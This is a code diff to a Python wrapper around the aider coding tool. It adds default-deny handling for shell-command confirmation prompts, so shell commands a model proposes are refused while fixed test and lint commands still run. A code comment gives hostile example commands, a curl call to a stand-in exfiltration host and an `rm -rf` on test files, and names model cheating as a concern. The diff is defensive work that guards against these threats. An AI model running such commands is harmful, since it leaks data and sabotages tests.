@@ -112,6 +112,22 @@ class GuardedInputOutput(InputOutput):
         "Create new file?",
     )
 
+    # Substrings that identify aider's shell-execution prompts. When yes=True,
+    # the parent class auto-approves ALL confirm_ask questions — including shell
+    # commands the MODEL emits (e.g. `yarn install`, `curl exfil.example.com`,
+    # `rm -rf tests/`). File-add filtering doesn't cover this because shell
+    # prompts arrive with no subject path. Default-deny at prompt level so a
+    # model can't spawn arbitrary subprocesses under our watch. This does NOT
+    # affect aider's auto_test / auto_lint execution: those run `test_cmd` /
+    # `lint_cmds` directly (not via confirm_ask), so pipeline test/lint stays
+    # fully functional. Only model-triggered shell escapes get blocked.
+    _SHELL_EXECUTION_PROMPTS: tuple[str, ...] = (
+        "Run shell command?",
+        "Run these shell commands?",
+        "Run shell commands?",
+        "Execute this shell command?",
+    )
+
     def __init__(
         self,
         *args,
@@ -128,9 +144,14 @@ class GuardedInputOutput(InputOutput):
             return False
         return any(p in question for p in self._FILE_ADD_PROMPTS)
 
+    def _is_shell_prompt(self, question: str | None) -> bool:
+        if not question:
+            return False
+        return any(p in question for p in self._SHELL_EXECUTION_PROMPTS)
+
     def _refuse(self, question: str, subject: str | None, reason: str) -> bool:
         _logger.warning(
-            "GuardedInputOutput refused file-add (%s): question=%r subject=%r",
+            "GuardedInputOutput refused prompt (%s): question=%r subject=%r",
             reason,
             question,
             subject,
@@ -148,10 +169,16 @@ class GuardedInputOutput(InputOutput):
         group=None,
         allow_never=False,
     ):
-        """Intercept file-add prompts; delegate all others to ``super().confirm_ask``.
+        """Intercept file-add and shell-execution prompts; delegate all others to super.
 
         Signature MUST match aider/io.py:807-815 exactly (Aider 0.86.3.dev).
+        Shell prompts are default-deny (no subject to check — the whole class of
+        model-triggered shell execution is refused). Fixed test_cmd / lint_cmds
+        still run because aider invokes those DIRECTLY (not via confirm_ask).
         """
+        if self._is_shell_prompt(question):
+            return self._refuse(question, subject, "shell execution not permitted (anti-cheat + safety)")
+
         if self._is_file_add_prompt(question):
             # Fail CLOSED: if no subject was passed, we cannot tell which file
             # Aider wants to add. Default-deny instead of delegating to super
